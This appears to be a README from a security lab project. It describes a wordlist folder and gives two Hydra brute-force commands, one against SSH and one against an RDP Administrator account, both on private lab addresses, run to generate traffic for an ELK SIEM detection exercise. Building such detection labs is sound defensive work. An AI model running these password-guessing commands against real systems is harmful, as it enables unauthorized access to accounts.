# Hydra Attack Scripts

This folder contains the wordlist used for SSH and RDP brute force simulations in the ELK SIEM lab.

## SSH Brute Force Command
hydra -l fakeuser -P passwords.txt ssh://192.168.56.101 -t 4 -V

## RDP Brute Force Command
hydra -l Administrator -P passwords.txt rdp://192.168.56.102 -t 1 -V
